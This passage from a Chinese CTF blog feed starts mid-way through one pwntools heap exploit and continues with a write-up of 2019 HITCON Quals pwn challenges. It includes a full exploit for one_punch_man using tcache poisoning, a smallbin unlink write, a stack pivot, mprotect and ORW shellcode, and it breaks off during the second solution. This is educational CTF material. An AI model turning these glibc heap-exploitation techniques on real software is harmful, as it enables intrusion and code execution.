punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target_heap<span class="token punctuation">)</span>guess<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x00007ffff7b83ca0</span><span class="token operator">+</span><span class="token number">0x7ffff7798000</span>success<span class="token punctuation">(</span><span class="token string">"libc addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>cookie<span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>guess<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x52145</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rax <span class="token operator">=</span> <span class="token number">0x0000000000043a77</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspop_rdi <span class="token operator">=</span> <span class="token number">0x000000000002155f</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspop_rsi <span class="token operator">=</span> <span class="token number">0x000000000013088a</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspop_rdx <span class="token operator">=</span> <span class="token number">0x0000000000001ba6</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresssyscall <span class="token operator">=</span> <span class="token number">0x00000000000d29d5</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressgdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"./flag"</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack_heap<span class="token operator">+</span><span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token number">2</span><span class="token punctuation">,</span>pop_rdi<span class="token punctuation">,</span>heap_addr<span class="token number">-0x70</span><span class="token punctuation">,</span>pop_rsi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>syscall<span class="token punctuation">,</span>                pop_rax<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>pop_rdi<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>pop_rsi<span class="token punctuation">,</span>heap_addr<span class="token operator">+</span><span class="token number">0x5a0</span><span class="token punctuation">,</span>pop_rdx<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>syscall<span class="token punctuation">,</span>               pop_rax<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>pop_rdi<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>pop_rsi<span class="token punctuation">,</span>heap_addr<span class="token operator">+</span><span class="token number">0x5a0</span><span class="token punctuation">,</span>pop_rdx<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>syscall<span class="token punctuation">]</span><span class="token punctuation">)</span>guess<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UAF </tag>
            
            <tag> 2.23 FSOP </tag>
            
            <tag> setcontext ORW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 Hitcon Qua部分PWN题复现</title>
      <link href="/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/"/>
      <url>/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h1><p>tag：2.29 largebin attack、tcache unlink smashing、python-AES-解密、pwn-misc</p><p>one_punch_man: double free的漏洞、calloc得到chunk，需要按照条件，某个值大于6，调用后门函数。思路一：tcache unlink smashing。思路二 largebin attack。 </p><p>trick_or_treat：创建一个任意大小的chunk，然后任意地址向后写入。发现改malloc_hook和free_hook为one_gadget都不能成功，没办法了，请教google了。最后是改free_hook为system，最后输入!/bin/sh来getshell。但是由于在输入的时候我们不能输入16进制数以外的数字，所以我们需要绕过一下：ed是一个旧的默认Unix控制台编辑器。通常ed是提供给用户，它功能非常简单，但它仍然有内部的第三方命令执行功能，非常类似于vim。一旦进，ed,我们可以通过执行!’/bin/sh’来获取正常的shell。</p><p>crypto_in_the_shell：1.libc地址 2.返回地址.这些都可以通过上溢出和下溢出来得到，得到之后将返回栈地址的值改为one_gadget就可以了。通过上溢出得到AESkey和iv的值，这样的话就可以通过python自带的解密函数来进行decode得到真实值。</p><h1 id="One-Punch-man"><a href="#One-Punch-man" class="headerlink" title="One-Punch-man"></a>One-Punch-man</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/0.png"></div>保护全开。<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>主函数：create、delete、edit、show、backdoor</p><p>create：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/1.png"></div>可以看到create使用calloc来分配，calloc的特点是不走tcache，和无tcache时的分配策略一样。size范围是0x80~0x400<p>delete：double free的漏洞</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/2.png"></div><p>show：puts出数据（\x00截断）</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/3.png"></div><p>edit：根据size来进行编辑</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/4.png"></div><p>backdoor函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/5.png"></div>调试发现第一个红框chunk+0x20处是tcache header中的一个值，判断该值大于6，可以调用malloc函数分配0x220的chunk，并read数据到这个chunk中。<p>注意里面有个沙箱：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/6.png"></div>仅能调用open、read、write、mmap、mprotect、close、exit函数。根据禁用的函数，我们考虑：ORW读出flag、mprotect提升数据段执行权限来得到flag。<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>既然有UAF，并且可以编辑那么首先想到的就是fastbin attack类型。但是这里的问题是create时不走tcache，释放却要走tcache。考虑在fastbin中double free由于size必须大于0x80，所以也放弃这个想法。<br>但是我们注意backdoor中malloc可以从tcache中拿chunk。那么就可以考虑利用UAF来将tcache中0x220chunk的fd改为hook来劫持程序流。<br>由于libc和heap地址都很好泄露，通过UAF就可以泄露libc（largebin 0x410）和heap地址（tcache链中有两个chunk就可以），那么问题就只有一个，就是如何调用这个backdoor。tcache header中对应的地址必须大于6，这个地方的值是tcache 0x220链的个数。发现修改这个地方的值没有别的方式来实现tcache中的“fastbin attack”。</p><p>这样的话问题就是如何修改这个地址的值。这里我们考虑三种方法：</p><p>1.largebin attack<br>2.smallbin attack，任意地址写libc地址<br>3.用UAF构造chunk overlap；用 tcache-&gt;counts 来伪造 size，用 tcache-&gt;entries 伪造 fake_chunk 的 fd 和 bk，提前布置好 堆布局，以便绕过 unlink 检查； unlink 控制 tcache-&gt;entries，劫持hook控制程序流，然后SROP再执行shellcode读取flag。</p><p>第一种思路相对比较明确，第三种不太清楚。详细介绍第二种方法：</p><p>通过分配smallbin利用UAF来达到任意地址写libc地址的目的。具体是怎样的呢？</p><p>当我们分配一个smallbin中的chunk时会进行一次unlink，当这个smallbin的链中有不止一个chunk的时候会进行归入 tcache 的操作：源代码中第一个红框是分配的那个smallbin的chunk进行unlink，下面的红框是剩余的smallbin中chunk归入tcache时的归类操作。我们看到下面的红框中没有完整性检查。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/22/2019-hitcon-qua-bu-fen-pwn-ti-fu-xian/7.png"></div><p>进一步分析各个参数：bin的值是main_arena附近的地址，bck的值是victim_chunk-&gt;bk。我们定位到bck-&gt;fd = bin。实际上就是*(bck+0x10) = bin(main_arena附近的libc 地址)，和unsorted bin attack类似的效果。bck由于UAF我们可控，那么就是任意地址写libc地址了。</p><p>实现效果类似unsorted bin attack，但是要求相对较多：<br>1.smallbin中同一条链至少两个chunk，先释放的为chunk1、后释放的为chunk2，根据smallbin分配原理，如果需要的话它会先分配chunk1给程序，此时tcache不满则对chunk2进行归入tcache操作。<br>2.接下来就是第二点：tcache对应的size的chunk number要等于6，否则由于归入chunk2后，此时tcache的chunk number&lt;7则还会进行一次unlink，参数的修改会导致程序崩溃。</p><p>最后需要再说明两点：<br>1.由于create的时候，先将数据读入栈中，再写到chunk中，所以最后劫持hook之后可以利用add esp 0x48；ret指令控制程序流进行rop，执行mprotect，最后再跳转进提前构造的shellcode执行。<br>2.最后mprotect也踩坑了，其start地址和length长度必须要以0x1000对齐。</p><h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span>  <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"split"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./one_punch"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./one_punch"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.29.so"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rename</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0xC388</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#---------fill 0x400 tcache &amp;&amp; leak heap and libc------</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x3f0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># leak heap</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"hero name: "</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x000055555555a660</span><span class="token operator">+</span><span class="token number">0x555555559000</span>success<span class="token punctuation">(</span><span class="token string">"heap address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x3f0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0xf0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># 释放一个0x400的chunk进入unsorted bin</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token operator">*</span><span class="token number">0x400</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 进入largebin，没什么luan用，之前想错了的一步</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>          p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"hero name: "</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x00007ffff7fb3090</span><span class="token operator">+</span><span class="token number">0x7ffff7dce000</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==>"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x210</span><span class="token operator">*</span><span class="token string">"a"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>rename<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#-------make two 0x100 small chunk &amp;&amp; smallbin attack:target addr writr libc addr---------------</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token operator">*</span><span class="token string">"a"</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x3f0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x2f0</span><span class="token operator">*</span><span class="token string">"a"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x3f0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x2f0</span><span class="token operator">*</span><span class="token string">"b"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x3f0</span><span class="token operator">*</span><span class="token string">"b"</span><span class="token punctuation">)</span>rename<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x2f0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x2f60</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x2f</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token operator">*</span><span class="token string">"c"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ----in order alloc 0x1000 addr in control, because mprotect limit---</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token operator">*</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 这是为了令与0x1000对其的地址是可控的</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token operator">*</span><span class="token string">"a"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"./flag"</span><span class="token punctuation">)</span>shellcode<span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>shellcode<span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>rename<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x160</span><span class="token operator">+</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>backdoor<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>backdoor<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x8cfd6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># add rsp 0x48</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x000000000012bda6</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x4000</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 以0x1000对齐</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rsi\nret\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 以0x1000对其</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"mprotect"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#payload+= p64(libc.search(asm("pop rip")).next())</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x4000</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"a"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>通过largebin attack来解决，本来以为2.29的largebin attack有新姿势，但是发现并没有，之前的largebin attack的攻击方法同样适用于2.29</p><p>这里主要说说遇到的坑点：</p><p>主要是条件限制，要来构造largebin attack的方法比较麻烦：最后是通过unsorted 